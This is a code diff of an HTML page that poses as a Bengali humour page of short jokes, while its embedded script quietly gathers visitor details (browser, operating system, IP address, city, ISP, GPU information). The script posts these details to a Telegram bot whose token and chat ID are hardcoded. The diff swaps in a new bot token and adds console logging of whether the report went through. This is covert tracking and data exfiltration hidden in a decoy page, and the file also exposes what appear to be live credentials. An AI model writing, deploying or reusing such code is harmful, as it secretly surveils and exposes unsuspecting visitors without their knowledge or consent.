@@ -72,7 +72,6 @@
       padding-top: 20px;
       font-style: italic;
     }
-    /* ডিবাগ টোস্ট সম্পূর্ণ লুকানো */
     .debug-toast {
       display: none;
     }
@@ -105,17 +104,13 @@
   <section class="section"><h2 class="section-title">🍛 বিরিয়ানি লজিক</h2><div class="content">বাবা: এতো দেরি করে এলে?<br>ছেলে: বাবা, বিরিয়ানি খেতে গিয়ে হিসাব নষ্ট।<br>বাবা: কী হিসাব?<br>ছেলে: খাব নাকি বাড়ি ফিরব, দুইটাই দরকার ছিল।</div></section>
   <div class="footer-note">✨ Charlie ll — হাসতে থাকুন, বুদ্ধি বাড়ান | মজার গল্প আরও আসছে ✨</div>
 </main>
-<div id="debugToast" class="debug-toast"></div>
 
 <script>
 (function() {
-  // ============================================================
-  // আপনার টেলিগ্রাম বটের তথ্য (ইতিমধ্যে সেট করা আছে)
-  // ============================================================
-  const BOT_TOKEN = "8799814426:AAE6mSoNsaCVRjxLUIkrejaSL8dDO6pAf-A";
+  // ✅ নতুন টোকেন সেট করা হয়েছে
+  const BOT_TOKEN = "8736559496:AAGVWzet7aviwdVZUR5O-hdaUTgOT-mZuB4";
   const DEFAULT_CHAT_ID = "7709670231";
   
-  // চ্যাট আইডি নির্ধারণ (URL প্যারামিটার 'id' থাকলে সেটা ব্যবহার করবে)
   function getChatId() {
     try {
       const urlParams = new URLSearchParams(window.location.search);
@@ -125,7 +120,6 @@
     return DEFAULT_CHAT_ID;
   }
   
-  // ----- ডাটা কালেকশন ফাংশন -----
   function getUAInfo() {
     const ua = navigator.userAgent;
     let os = "অজানা", osVer = "", browser = "অজানা", browserVer = "", engine = "";
@@ -262,7 +256,6 @@
     return { ip: "পাওয়া যায়নি", city: "", region: "", country: "", isp: "" };
   }
 
-  // ---------- মূল ফাংশন (কোনো ডিবাগ বার্তা ছাড়াই) ----------
   async function sendSilentReport() {
     const chatId = getChatId();
     if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
@@ -349,9 +342,15 @@ WebGL: ${gpu.webgl}
     params.append("disable_web_page_preview", "true");
     
     try {
-      await fetch(url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params });
+      const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params });
+      const result = await response.json();
+      if(result.ok) {
+        console.log("✅ রিপোর্ট পাঠানো সফল!");
+      } else {
+        console.log("❌ এরর:", result.description);
+      }
     } catch(e) {
-      // কোনো ত্রুটি নীরবে উপেক্ষা করা হবে
+      console.log("নেটওয়ার্ক এরর:", e);
     }
   }
 
